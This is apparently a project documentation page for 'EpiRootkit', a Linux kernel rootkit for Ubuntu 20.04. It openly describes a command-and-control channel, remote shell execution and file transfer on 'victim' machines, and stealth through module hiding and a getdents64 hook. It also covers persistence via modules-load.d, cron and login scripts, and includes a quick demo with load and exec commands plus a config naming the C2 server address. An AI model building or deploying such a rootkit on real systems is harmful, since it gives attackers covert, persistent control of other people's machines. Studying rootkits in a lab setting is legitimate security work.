---
title: "EpiRootkit Overview"
description: "Linux kernel rootkit for Ubuntu 20.04 / kernel 5.4.0"
icon: "shield"
date: "2025-05-25T16:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 501
---

# EpiRootkit

Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).

## What We Built

EpiRootkit is a kernel module that provides:

- **C2 Communication**: TCP connection to command & control server
- **Remote Commands**: Execute shell commands with output capture
- **File Transfer**: Upload/download files between C2 and victim
- **Authentication**: SHA-512 password verification with rate limiting
- **Stealth**: Hide module from `lsmod` and hide files from directory listings
- **Persistence**: Multiple mechanisms to survive reboots
- **Proper Deployment**: Two-stage architecture following Linux best practices

## Architecture

### Deployment Architecture
```
Deployment Script  ←→  EpiRootkit (Kernel Module)  ←→  Target System
Stage 1: Loader       Stage 2: Runtime            Linux Kernel 5.4.0
```

**Two-Stage Deployment:**
- **Stage 1 (Loader)**: `scripts/deploy_rootkit.sh` handles proper module deployment
- **Stage 2 (Runtime)**: Rootkit focuses on functionality, not self-deployment

### Communication Architecture
```
C2 Server (Node.js)  ←→  EpiRootkit (Kernel Module)  ←→  Target System
Port 4444                Network + Commands              Linux Kernel 5.4.0
```

## Quick Demo

```bash
# 1. Build and load rootkit
cd rootkit && make && sudo insmod epirootkit.ko

# 2. Start C2 server  
cd attacking_program && pnpm start

# 3. Use the rootkit
c2-server$ auth Client-1 password
c2-server$ exec Client-1 whoami
c2-server$ status Client-1
```

## Core Components

### Network Layer
- **Connection Management**: Persistent TCP connection with auto-reconnect
- **Keepalive System**: 60-second ping/pong to detect disconnections
- **Socket Handling**: Low-level network operations

### Command System
- **Authentication**: `auth` - SHA-512 password verification
- **Execution**: `exec` - Run shell commands with output capture
- **File Operations**: `upload`/`download` - Transfer files
- **Status**: `status` - Get rootkit information
- **Persistence**: `persist_*` - Install/remove boot persistence
- **Stealth**: `hide_module`/`unhide_module` - Toggle visibility

### Stealth Features
- **Module Hiding**: Remove from kernel module list (`lsmod`)
- **File Hiding**: Hide files with specific prefixes from directory listings
- **Syscall Hooking**: Uses kretprobe on `getdents64`

### Persistence Mechanisms
- **modules-load.d**: Systemd automatic module loading
- **Cron Jobs**: Scheduled module loading
- **Shell Profiles**: Load via user login scripts

## Technical Details

- **Target**: Ubuntu 20.04 LTS with kernel 5.4.0
- **Language**: C (kernel module) + Node.js (C2 server)
- **APIs Used**: ftrace, kretprobe, VFS, crypto API
- **Network**: TCP on port 4444 (configurable)
- **Authentication**: SHA-512 with rate limiting (5 attempts/60s)

## Configuration

Key settings in `rootkit/core/config.h`:
```c
#define C2_SERVER_IP "192.168.64.1"
#define C2_SERVER_PORT 4444
#define ENABLE_ENCRYPTION 0        // Currently disabled
#define ENABLE_PERSISTENCE 1       // Auto-install persistence
#define ENABLE_FILE_HIDING 1       // Hide files with prefixes
```

## Documentation Structure

- **[Deployment](./deployment.md)**: How to build and load the rootkit
- **[Connection](./connection-authentication.md)**: Network communication setup
- **[Commands](./features/command-execution.md)**: Remote command execution
- **[File Transfer](./features/file-transfer.md)**: Upload/download files
- **[Stealth](./features/hiding.md)**: Module and file hiding
- **[Persistence](./features/persistence.md)**: Boot survival mechanisms


